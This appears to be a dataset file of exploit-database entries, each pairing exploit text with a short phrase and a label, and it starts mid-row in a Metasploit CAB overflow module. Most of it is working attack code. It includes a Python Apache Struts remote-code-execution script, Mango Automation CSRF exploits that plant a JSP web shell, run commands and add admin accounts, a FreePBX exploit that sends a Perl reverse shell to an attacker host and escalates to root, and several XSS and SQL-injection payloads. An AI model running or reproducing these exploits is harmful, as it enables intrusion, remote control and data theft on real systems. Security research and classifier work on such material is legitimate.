""\x00\x00\x00\x00\x00\x00\xE2\x36\x53\xAD\x20\x00""  		sploit =  make_nops(268 - payload.encoded.length) + payload.encoded 		sploit << Rex::Arch::X86.jmp_short(6) + make_nops(2) + [target.ret].pack('V') 		sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, ""call $-260"").encode_string 		sploit << make_nops(800)  		cab = cab_header + sploit  		print_status(""Creating '#{datastore['FILENAME']}' file ..."")  		file_create(cab)  	end  end  =begin 0:001> !exchain 00cdf1b0: VetE!InoAvpackDat+ca058 (600d19c8) 00cdf2fc: 316a4130 Invalid exception stack at 6a413969 0:001> !pattern_offset 1024 0x6a413969 [Byakugan] Control of 0x6a413969 at offset 268. 0:001> !pattern_offset 1024 0x316a4130 [Byakugan] Control of 0x316a4130 at offset 272. 0:001> u 0x6dc886ea L3 INOCORE!QSIInitQSysInfo+0x278a: 6dc886ea 5f              pop     edi 6dc886eb 5e              pop     esi 6dc886ec c3              ret =end",creating a specially crafted CAB file,1
38179,"Dell OpenManage Server Administrator - Cross-Site Scripting source: https://www.securityfocus.com/bid/57212/info  Dell OpenManage Server Administrator is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.  OpenManage Server Administrator 7.1.0.1 and prior versions are vulnerable.   https://www.example.com:1311/help/sm/en/Output/wwhelp/wwhimpl/js/html/index_main.htm?topic=""></iframe><iframe src=""javascript:alert(/xss/)",malicious local file,1
39407,"Viprinet Multichannel VPN Router 300 - Persistent Cross-Site Scripting Vulnerability title: Multiple Instances Of Cross-site Scripting In Viprinet Multichannel VPN Router 300  CVE: CVE-2014-2045  Vendor: Viprinet  Product: Multichannel VPN Router 300  Affected version: 2013070830/2013080900  Fixed version: 	2014013131/2014020702 Reported by: Tim Brown Details:  	The data supplied to both the `old’ and `new’ web applications (the device has two web based management interfaces) was permanently stored and could be retrieved later by other users. This is a normal feature of many applications, however, in this instance the application failed to restrict the type of data that could be stored and also failed to sanitise it, meaning that it could not be safely rendered by the browser.  	Stored cross-site scripting could be triggered by:  	 		Attempting to login with a username of `<script>alert(1)</script>’ (affects `old’ interface and results in post-authentication cross-site Scripting when a legitimate administrator views the realtime log) 		Creating an account with a username of `<script>alert(1)</script>’ (affects both `old’ and `new’ interfaces once created) 		Setting the device’s hostname to `<script>alert(1)</script>’  (affects `old’ interface once created) 	  	A number of locations were identified as being vulnerable to reflective attacks, including:   http://<host>/exec?module=config&sessionid=<sessionid>&inspect=%3Cscript%20src=http://localhost:9090%3E%3C/script%3E http://<host>/exec?tool=atcommands&sessionid=<sessionid>&sourceobject=WANINTERFACELIST.OBJECT__0&module=configtools&commands=%3Cscript%3Ealert%281%29%3C%2Fscript%3E http://<host>/exec?tool=ping&sessionid=<sessionid>&sourceobject=WANINTERFACELIST.OBJECT__0&module=configtools&host=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pingcount=3&databytes=56   	The inclusion of session IDs in all URLs partially mitigates the reflective cross-site scripting but could itself be considered a vulnerability since it is included in referred headers and log files.  	These are simply some examples of how this attack might be performed, and the it is believed that both the `old’ and `new’ web applications are systemically vulnerable to this.                    Further details at:   https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2045/    Copyright: Copyright (c) Portcullis Computer Security Limited 2015, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of Portcullis Computer Security Limited.  Disclaimer: The information herein contained may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user's risk. In no event shall the author/distributor (Portcullis Computer Security Limited) be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information.",arbitrary malicious database commands,1
45260,"Apache Struts 2.3 < 2.3.34 / 2.5 < 2.5.16 - Remote Code Execution (1) #!/usr/bin/env python3 # coding=utf-8 # ***************************************************** # struts-pwn: Apache Struts CVE-2018-11776 Exploit # Author: # Mazin Ahmed <Mazin AT MazinAhmed DOT net> # This code uses a payload from: # https://github.com/jas502n/St2-057 # *****************************************************  import argparse import random import requests import sys try:     from urllib import parse as urlparse except ImportError:     import urlparse  # Disable SSL warnings try:     import requests.packages.urllib3     requests.packages.urllib3.disable_warnings() except Exception:     pass  if len(sys.argv) <= 1:     print('[*] CVE: 2018-11776 - Apache Struts2 S2-057')     print('[*] Struts-PWN - @mazen160')     print('\n%s -h for help.' % (sys.argv[0]))     exit(0)   parser = argparse.ArgumentParser() parser.add_argument(""-u"", ""--url"",                     dest=""url"",                     help=""Check a single URL."",                     action='store') parser.add_argument(""-l"", ""--list"",                     dest=""usedlist"",                     help=""Check a list of URLs."",                     action='store') parser.add_argument(""-c"", ""--cmd"",                     dest=""cmd"",                     help=""Command to execute. (Default: 'id')"",                     action='store',                     default='id') parser.add_argument(""--exploit"",                     dest=""do_exploit"",                     help=""Exploit."",                     action='store_true')   args = parser.parse_args() url = args.url if args.url else None usedlist = args.usedlist if args.usedlist else None cmd = args.cmd if args.cmd else None do_exploit = args.do_exploit if args.do_exploit else None  headers = {     'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2018-11776)',     # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',     'Accept': '*/*' } timeout = 3   def parse_url(url):     """"""     Parses the URL.     """"""      # url: http://example.com/demo/struts2-showcase/index.action      url = url.replace('#', '%23')     url = url.replace(' ', '%20')      if ('://' not in url):         url = str(""http://"") + str(url)     scheme = urlparse.urlparse(url).scheme      # Site: http://example.com     site = scheme + '://' + urlparse.urlparse(url).netloc      # FilePath: /demo/struts2-showcase/index.action     file_path = urlparse.urlparse(url).path     if (file_path == ''):         file_path = '/'      # Filename: index.action     try:         filename = url.split('/')[-1]     except IndexError:         filename = ''      # File Dir: /demo/struts2-showcase/     file_dir = file_path.rstrip(filename)     if (file_dir == ''):         file_dir = '/'      return({""site"": site,             ""file_dir"": file_dir,             ""filename"": filename})   def build_injection_inputs(url):     """"""     Builds injection inputs for the check.     """"""      parsed_url = parse_url(url)     injection_inputs = []     url_directories = parsed_url[""file_dir""].split(""/"")      try:         url_directories.remove("""")     except ValueError:         pass      for i in range(len(url_directories)):         injection_entry = ""/"".join(url_directories[:i])          if not injection_entry.startswith(""/""):             injection_entry = ""/%s"" % (injection_entry)          if not injection_entry.endswith(""/""):             injection_entry = ""%s/"" % (injection_entry)          injection_entry += ""{{INJECTION_POINT}}/""  # It will be renderred later with the payload.         injection_entry += parsed_url[""filename""]          injection_inputs.append(injection_entry)      return(injection_inputs)   def check(url):     random_value = int(''.join(random.choice('0123456789') for i in range(2)))     multiplication_value = random_value * random_value     injection_points = build_injection_inputs(url)     parsed_url = parse_url(url)     print(""[%] Checking for CVE-2018-11776"")     print(""[*] URL: %s"" % (url))     print(""[*] Total of Attempts: (%s)"" % (len(injection_points)))     attempts_counter = 0      for injection_point in injection_points:         attempts_counter += 1         print(""[%s/%s]"" % (attempts_counter, len(injection_points)))         testing_url = ""%s%s"" % (parsed_url[""site""], injection_point)         testing_url = testing_url.replace(""{{INJECTION_POINT}}"", ""${{%s*%s}}"" % (random_value, random_value))         try:             resp = requests.get(testing_url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)         except Exception as e:             print(""EXCEPTION::::--> "" + str(e))             continue         if ""Location"" in resp.headers.keys():             if str(multiplication_value) in resp.headers['Location']:                 print(""[*] Status: Vulnerable!"")                 return(injection_point)     print(""[*] Status: Not Affected."")     return(None)   def exploit(url, cmd):     parsed_url = parse_url(url)      injection_point = check(url)     if injection_point is None:         print(""[%] Target is not vulnerable."")         return(0)     print(""[%] Exploiting..."")      payload = """"""%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{0}%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D"""""".format(cmd)      testing_url = ""%s%s"" % (parsed_url[""site""], injection_point)     testing_url = testing_url.replace(""{{INJECTION_POINT}}"", payload)      try:         resp = requests.get(testing_url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)     except Exception as e:         print(""EXCEPTION::::--> "" + str(e))         return(1)      print(""[%] Response:"")     print(resp.text)     return(0)   def main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit):     if url:         if not do_exploit:             check(url)         else:             exploit(url, cmd)      if usedlist:         URLs_List = []         try:             f_file = open(str(usedlist), ""r"")             URLs_List = f_file.read().replace(""\r"", """").split(""\n"")             try:                 URLs_List.remove("""")             except ValueError:                 pass             f_file.close()         except Exception as e:             print(""Error: There was an error in reading list file."")             print(""Exception: "" + str(e))             exit(1)         for url in URLs_List:             if not do_exploit:                 check(url)             else:                 exploit(url, cmd)      print(""[%] Done."")   if __name__ == ""__main__"":     try:         main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit)     except KeyboardInterrupt:         print(""\nKeyboardInterrupt Detected."")         print(""Exiting..."")         exit(0)","malicious ""add_boolean"" function",1
41655,"Microsoft Windows - Uniscribe Font Processing Multiple Heap Out-of-Bounds and Wild Reads (MS17-011) Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1031  Through fuzzing, we have discovered a number of different crashes in the Windows Uniscribe user-mode library, while trying to display text using a corrupted font file or calling documented Uniscribe API functions against such malformed fonts. In this bug, we address a variety of crashes manifested through invalid memory READ accesses. Some of them occur at page boundaries, while other at seemingly valid yet non-mapped addresses. The sheer amount of the crashes makes it very difficult for us to assess the root cause, severity and impact of each of them within a reasonable time-frame. Consequently, we have only performed basic deduplication based on the top-level address of the faulting instruction, and are reporting all of such crashes in this single bug tracker entry.  A summary of the crash locations is as follows:  -------------------------------------------------------------- 1	USP10!otlMultiSubstLookup::apply+0xa8 2	USP10!otlSingleSubstLookup::applyToSingleGlyph+0x98 3	USP10!otlSingleSubstLookup::apply+0xa9 4	USP10!otlMultiSubstLookup::getCoverageTable+0x2c 5	USP10!otlMark2Array::mark2Anchor+0x18 6	USP10!GetSubstGlyph+0x2e 7	USP10!BuildTableCache+0x1ca 8	USP10!otlMkMkPosLookup::apply+0x1b4 9	USP10!otlLookupTable::markFilteringSet+0x1a 10	USP10!otlSinglePosLookup::getCoverageTable+0x12 11	USP10!BuildTableCache+0x1e7 12	USP10!otlChainingLookup::getCoverageTable+0x15 13	USP10!otlReverseChainingLookup::getCoverageTable+0x15 14	USP10!otlLigCaretListTable::coverage+0x7 15	USP10!otlMultiSubstLookup::apply+0x99 16	USP10!otlTableCacheData::FindLookupList+0x9 17	USP10!ttoGetTableData+0x4b4 18	USP10!GetSubtableCoverage+0x1ab 19	USP10!otlChainingLookup::apply+0x2d 20	USP10!MergeLigRecords+0x132 21	USP10!otlLookupTable::subTable+0x23 22	USP10!GetMaxParameter+0x53 23	USP10!ApplyLookup+0xc3 24	USP10!ApplyLookupToSingleGlyph+0x6f 25	USP10!ttoGetTableData+0x19f6 26	USP10!otlExtensionLookup::extensionSubTable+0x1d 27	USP10!ttoGetTableData+0x1a77 --------------------------------------------------------------  All of the issues reproduce successfully on Windows 7. It is highly encouraged to enable PageHeap for the test program in order to get reliable repros. It is also necessary to use a custom program which displays all of the font's glyphs at various point sizes, and additionally calls some of the Uniscribe-specific API functions.  Attached is an archive with textual crash excerpts and up to 3 samples per each unique crash.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41655.zip",a corrupted font file or calling documented Uniscribe API functions against such malformed fonts,1
38338,"Mango Automation 2.6.0 - Multiple Vulnerabilities Mango Automation 2.6.0 CSRF File Upload And Arbitrary JSP Code Execution   Vendor: Infinite Automation Systems Inc. Product web page: http://www.infiniteautomation.com/ Affected version: 2.5.2 and 2.6.0 beta (build 327)  Summary: Mango Automation is a flexible SCADA, HMI And Automation software application that allows you to view, log, graph, animate, alarm, and report on data from sensors, equipment, PLCs, databases, webpages, etc. It is easy, affordable, and open source.  Desc: Mango suffers from an authenticated arbitrary JSP code execution. The vulnerability is caused due to the improper verification of uploaded image files in 'graphicalViewsBackgroundUpload' script via the 'backgroundImage' POST parameter which allows of arbitrary files being uploaded in '/modules/graphicalViews/web/graphicalViewUploads/'. This can be exploited to execute arbitrary JSP code by uploading a malicious JSP script file that will be stored as a sequence number depending on how many files were uploaded (1.jsp or 2.jsp or 3.jsp .. n.jsp).  Tested on: Microsoft Windows 7 Professional SP1 (EN) 32/64bit            Microsoft Windows 7 Ultimate SP1 (EN) 32/64bit            Jetty(9.2.2.v20140723)            Java(TM) SE Runtime Environment (build 1.8.0_51-b16)            Java HotSpot(TM) Client VM (build 25.51-b03, mixed mode)   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2015-5262 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5262.php   20.08.2015  --   <html>   <body>     <script>       function submitRequest()       {         var xhr = new XMLHttpRequest();         xhr.open(""POST"", ""http://localhost:8080/graphicalViewsBackgroundUpload"", true);         xhr.setRequestHeader(""Accept"", ""text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"");         xhr.setRequestHeader(""Content-Type"", ""multipart/form-data; boundary=----WebKitFormBoundaryb8cxmjBwpzDcHUVI"");         xhr.setRequestHeader(""Accept-Language"", ""en-US,en;q=0.8"");         xhr.withCredentials = true;         var body = ""------WebKitFormBoundaryb8cxmjBwpzDcHUVI\r\n"" +            ""Content-Disposition: form-data; name=\""backgroundImage\""; filename=\""cmd.jsp\""\r\n"" +            ""Content-Type: application/octet-stream\r\n"" +            ""\r\n"" +            ""\x3c%@ page import=\""java.util.*,java.io.*,java.net.*\""%\x3e\r\n"" +            ""\x3cHTML\x3e\x3cBODY\x3e\r\n"" +            ""\x3cFORM METHOD=\""POST\"" NAME=\""myform\"" ACTION=\""\""\x3e\r\n"" +            ""\x3cINPUT TYPE=\""text\"" NAME=\""cmd\""\x3e\r\n"" +            ""\x3cINPUT TYPE=\""submit\"" VALUE=\""Send\""\x3e\r\n"" +            ""\x3c/FORM\x3e\r\n"" +            ""\x3cpre\x3e\r\n"" +            ""\x3c%\r\n"" +            ""if (request.getParameter(\""cmd\"") != null) {\r\n"" +            ""        out.println(\""Command: \"" + request.getParameter(\""cmd\"") + \""\\n\x3cBR\x3e\"");\r\n"" +            ""        Process p = Runtime.getRuntime().exec(\""cmd.exe /c \"" + request.getParameter(\""cmd\""));\r\n"" +            ""        OutputStream os = p.getOutputStream();\r\n"" +            ""        InputStream in = p.getInputStream();\r\n"" +            ""        DataInputStream dis = new DataInputStream(in);\r\n"" +            ""        String disr = dis.readLine();\r\n"" +            ""        while ( disr != null ) {\r\n"" +            ""                out.println(disr); disr = dis.readLine(); }\r\n"" +            ""        }\r\n"" +            ""%\x3e\r\n"" +            ""\x3c/pre\x3e\r\n"" +            ""\x3c/BODY\x3e\x3c/HTML\x3e\r\n"" +            ""------WebKitFormBoundaryb8cxmjBwpzDcHUVI--\r\n"";         var aBody = new Uint8Array(body.length);         for (var i = 0; i < aBody.length; i++)           aBody[i] = body.charCodeAt(i);          xhr.send(new Blob([aBody]));       }     </script>     <form action=""#"">       <input type=""button"" value=""Submit request"" onclick=""submitRequest();"" />     </form>   </body> </html>   Webshell: http://localhost:8080/modules/graphicalViews/web/graphicalViewUploads/17.jsp  #################################################################  Mango Automation 2.6.0 CSRF Arbitrary Command Execution Exploit   Advisory ID: ZSL-2015-5261 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5261.php   20.08.2015  --   <html>   <body>     <form action=""http://localhost:8080/dwr/call/plaincall/EventHandlersDwr.testProcessCommand.dwr"" method=""POST"">       <input type=""hidden"" name=""callCount"" value=""1"" />       <input type=""hidden"" name=""page"" value=""&#47;event&#95;handlers&#46;shtm"" />       <input type=""hidden"" name=""httpSessionId"" value=""&#13;"" />       <input type=""hidden"" name=""scriptSessionId"" value=""26D579040C1C11D2E21D1E5F321094E5866"" />       <input type=""hidden"" name=""c0&#45;scriptName"" value=""EventHandlersDwr"" />       <input type=""hidden"" name=""c0&#45;methodName"" value=""testProcessCommand"" />       <input type=""hidden"" name=""c0&#45;id"" value=""0"" />       <input type=""hidden"" name=""c0&#45;param0"" value=""string&#58;C&#58;&#92;&#92;windows&#92;&#92;system32&#92;&#92;calc&#46;exe"" />       <input type=""hidden"" name=""c0&#45;param1"" value=""string&#58;15"" />       <input type=""hidden"" name=""batchId"" value=""24"" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html>  #################################################################  Mango Automation 2.6.0 Unprotected Debug Log View Vulnerability   Advisory ID: ZSL-2015-5260 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5260.php   20.08.2015  --   One scenario is where the attacker visits the following URL and takes over the admin session (given that the administrator didn't manually disabled the debugging and has produced some exception in current session):   - http://localhost:8080/status/   Other scenario is where the attacker sends a link to the victim so the victim after clicking on the link, generates exception and writes all his session attributes in the status page:   - http://localhost/status/mango.json?time=$  - http://localhost/status/   Sample status output: \""$\""\r\n\r\n\r\nSESSION ATTRIBUTES\r\n   sessionUser=User [id=6, username=n00b, password=NWoZK3kTsExUV00Ywo1G5jlUKKs=, email=z@s.l, phone=123321, admin=true, disabled=false, dataSourcePermissions=[], dataPointPermissions=[], homeUrl=, lastLogin=1440142956496, receiveAlarmEmails=0, receiveOwnAuditEvents=false, timezone=]\r\n   LONG_POLL_DATA_TIMEOUT=1440143583487\r\n   LONG_POLL_DATA=[com.serotonin.m2m2.web.dwr.longPoll.LongPollData@839308, com.serotonin.m2m2.web.dwr.longPoll.LongPollData@1b4dafa]\r\n\r\n\r\nCONTEXT ATTRIBUTES\r\n   DwrContainer=org.directwebremoting.impl.DefaultContainer@138158\r\n   constants.EventType.EventTypeNames.AUDIT=AUDIT\r\n   constants.SystemEventType.TYPE_USER_LOGIN=USER_LOGIN\r\n   constants.Permissions.DataPointAccessTypes.READ=1\r\n   org.directwebremoting.ContainerList=[org.directwebremoting.impl.DefaultContainer@138158]\r\n   constants.DataTypes.BINARY=1\r\n   constants.UserComment.TYPE_EVENT=1\r\n   constants.SystemEventType.TYPE_SYSTEM_STARTUP=SYSTEM_STARTUP\r\n   javax.servlet.ServletConfig=org.eclipse.jetty.servlet.ServletHolder$Config@bc620e\r\n      Also you can list all of the Classes known to DWR:   - http://localhost:8080/dwr/index.html  #################################################################  Mango Automation 2.6.0 CSRF Arbitrary SQL Query Execution  Advisory ID: ZSL-2015-5259 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5259.php   20.08.2015  --   SQL query in version 2.5.2 (pass 123123) with hash injection: ------------------------------------------------------------- INSERT INTO USERS VALUES(1337,'gjoko','YB8YiWZ++uuzO4wSVyg12j8Cf3g=','gjoko@z.sl','','Y','N',1440075860103,'','0','N','','Y'); 1 records(s) updated.   SQL query in version 2.6.0 beta build 327 (pass 123123) with hash injection: ---------------------------------------------------------------------------- INSERT INTO USERS VALUES(1337,'gjoko','YB8YiWZ++uuzO4wSVyg12j8Cf3g=','gjoko@z.sl','','N',1440075860103,'','0','N','','Y','superadmin'); 1 records(s) updated.  USERS table: ID USERNAME PASSWORD EMAIL PHONE DISABLED LASTLOGIN HOMEURL RECEIVEALARMEMAILS RECEIVEOWNAUDITEVENTS TIMEZONE MUTED PERMISSIONS  1.  POST /sqlConsole.shtm HTTP/1.1 Host: localhost:8080 Content-Length: 51 Cache-Control: max-age=0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Origin: http://localhost:8080 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 Content-Type: application/x-www-form-urlencoded Referer: http://localhost:8080/sqlConsole.shtm Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.8 Cookie: MANGO8080=13208s4v50p7duy7hjzmxetz1  sqlString=select+*+from+users%3B&query=Submit+query   2.   POST /sqlConsole.shtm HTTP/1.1 Host: localhost:8080 Content-Length: 54 Cache-Control: max-age=0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Origin: http://localhost:8080 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 Content-Type: application/x-www-form-urlencoded Referer: http://localhost:8080/sqlConsole.shtm Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.8 Cookie: MANGO8080=13208s4v50p7duy7hjzmxetz1  sqlString=select+*+from+users%3B&tables=Get+table+list   3.    POST /sqlConsole.shtm HTTP/1.1 Host: localhost:8080 Content-Length: 246 Cache-Control: max-age=0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Origin: http://localhost:8080 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 Content-Type: application/x-www-form-urlencoded Referer: http://localhost:8080/sqlConsole.shtm Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.8 Cookie: MANGO8080=13208s4v50p7duy7hjzmxetz1  sqlString=INSERT+INTO+USERS+VALUES%289%2C%27gjoko3%27%2C%27YB8YiWZ%2B%2BuuzO4wSVyg12j8Cf3g%3D%27%2C%27gjoko%40z.sl%27%2C%27333222111%27%2C%27Y%27%2C%27N%27%2C1440075860103%2C%27%27%2C%270%27%2C%27N%27%2C%27%27%2C%27Y%27%29%3B&update=Submit+update  #################################################################  Mango Automation 2.6.0 CSRF Add Admin Exploit  Advisory ID: ZSL-2015-5258 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5258.php   20.08.2015  --  2.5.2: <!-- user hacker, pass 123123 --> <html>   <body>     <form action=""http://localhost:8080/dwr/call/plaincall/UsersDwr.saveUserAdmin.dwr"" method=""POST"" enctype=""text/plain"">       <input type=""hidden"" name=""callCount"" value=""1&#10;page&#61;&#47;users&#46;shtm&#10;httpSessionId&#61;&#10;scriptSessionId&#61;8BD64066486071219EB8691611D48F14109&#10;c0&#45;scriptName&#61;UsersDwr&#10;c0&#45;methodName&#61;saveUserAdmin&#10;c0&#45;id&#61;0&#10;c0&#45;param0&#61;number&#58;&#45;1&#10;c0&#45;param1&#61;string&#58;hacker&#10;c0&#45;param2&#61;string&#58;123123&#10;c0&#45;param3&#61;string&#58;hacker&#37;40hacker&#46;hack&#10;c0&#45;param4&#61;string&#58;111222333&#10;c0&#45;param5&#61;boolean&#58;true&#10;c0&#45;param6&#61;boolean&#58;false&#10;c0&#45;param7&#61;string&#58;0&#10;c0&#45;param8&#61;boolean&#58;false&#10;c0&#45;param9&#61;string&#58;&#10;c0&#45;param10&#61;Array&#58;&#91;&#93;&#10;c0&#45;param11&#61;Array&#58;&#91;&#93;&#10;batchId&#61;5&#10;"" />       <input type=""submit"" value=""Submit request 1"" />     </form>   </body> </html>   2.6.0 beta (build 327): <!-- user hacker3, pass admin (in sha1(base64) hash value) --> <html>   <body>     <form action=""http://localhost:8080/rest/v1/users.json"" method=""POST"" enctype=""text/plain"">       <input type=""hidden"" name=""&#123;&quot;username&quot;&#58;&quot;hacker3&quot;&#44;&quot;password&quot;&#58;&quot;0DPiKuNIrrVmD8IUCuw1hQxNqZc"" value=""&quot;&#44;&quot;email&quot;&#58;&quot;hacker&#64;zeroscience&#46;mk&quot;&#44;&quot;phone&quot;&#58;&quot;111222333&quot;&#44;&quot;muted&quot;&#58;true&#44;&quot;disabled&quot;&#58;false&#44;&quot;homeUrl&quot;&#58;&quot;http&#58;&#47;&#47;www&#46;zeroscience&#46;mk&quot;&#44;&quot;receiveAlarmEmails&quot;&#58;&quot;NONE&quot;&#44;&quot;receiveOwnAuditEvents&quot;&#58;false&#44;&quot;timezone&quot;&#58;&quot;&quot;&#44;&quot;permissions&quot;&#58;&quot;user&#44;superadmin&quot;&#125;"" />       <input type=""submit"" value=""Submit request 2"" />     </form>   </body> </html>  #################################################################  Mango Automation 2.6.0 Remote XSS POST Injection Vulnerability  Advisory ID: ZSL-2015-5257 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5257.php   20.08.2015  --   <html>   <head>     <title>Mango Automation 2.6.0 Remote XSS POST Injection Vulnerability</title>   </head>   <body>     <form name=""login"" method=""post"" action=""http://localhost:8080/login.htm"">     <input type=""hidden"" name=""username"" value='""><script>alert(""XSS"");</script>' />     <input type=""hidden"" name=""password"" value=""blah"" />     </form>     <script type=""text/javascript"">     document.login.submit();     </script>   </body> </html>  #################################################################  Mango Automation 2.6.0 User Enumeration Weakness  Advisory ID: ZSL-2015-5256 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5256.php   20.08.2015  --   Request for non-existent username: ----------------------------------  POST /login.htm HTTP/1.1 Host: localhost:8080 Content-Length: 29 Cache-Control: max-age=0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Origin: http://localhost:8080 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36 Content-Type: application/x-www-form-urlencoded Referer: http://localhost:8080/login.htm;jsessionid=6zpfpnxljyzf13l3zrpx9e0xd Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.8 Cookie: MANGO8080=6zpfpnxljyzf13l3zrpx9e0xd  username=noob&password=123123   Response:   - <td class=""formError"">User id not found</td>   Request for existent username: ------------------------------  POST /login.htm HTTP/1.1 Host: localhost:8080 Content-Length: 32 Cache-Control: max-age=0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Origin: http://localhost:8080 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36 Content-Type: application/x-www-form-urlencoded Referer: http://localhost:8080/login.htm Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.8 Cookie: MANGO8080=6zpfpnxljyzf13l3zrpx9e0xd  username=admin&password=123123   Response:   - <td colspan=""3"" class=""formError"">Invalid login<br/>",uploading a malicious JSP script file that will be stored as a sequence number,1
18650,"FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution #!/usr/bin/python ############################################################ # Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit # Google Dork: oy vey # Date: March 23rd, 2012 # Author: muts # Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others. # Tested on: multiple # CVE : notyet # Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/  # Archive Url : http://www.offensive-security.com/0day/freepbx_callmenum.py.txt ############################################################ # Discovered by Martin Tschirsich # http://seclists.org/fulldisclosure/2012/Mar/234 # http://www.exploit-db.com/exploits/18649 ############################################################ import urllib rhost=""172.16.254.72"" lhost=""172.16.254.223"" lport=443 extension=""1000""  # Reverse shell payload  url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'  urllib.urlopen(url)  # On Elastix, once we have a shell, we can escalate to root: # root@bt:~# nc -lvp 443 # listening on [any] 443 ... # connect to [172.16.254.223] from voip [172.16.254.72] 43415 # id # uid=100(asterisk) gid=101(asterisk) # sudo nmap --interactive  # Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) # Welcome to Interactive Mode -- press h <enter> for help # nmap> !sh # id # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)",a malicious user,1
34596,"Pligg CMS 1.0.4 - SQL Injection / Cross-Site Scripting source: https://www.securityfocus.com/bid/42967/info  Pligg CMS is prone to an SQL-injection vulnerability and a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Pligg CMS 1.0.4 is vulnerable; other versions may also be affected.   The following example URIs are available:  http://www.example.com//pliggcms_1_0_4/login.php?email=sql'injection&processlogin=3&return=%2fpliggcms_1_0_4%2f http://www.example.com/pliggcms_1_0_4/user.php?category=%22%20onmouseover%3dprompt%28938687%29%20bad%3d%22&id=&keyword=Search..&login=&module=&page=&search=&view=search",malicious page,1
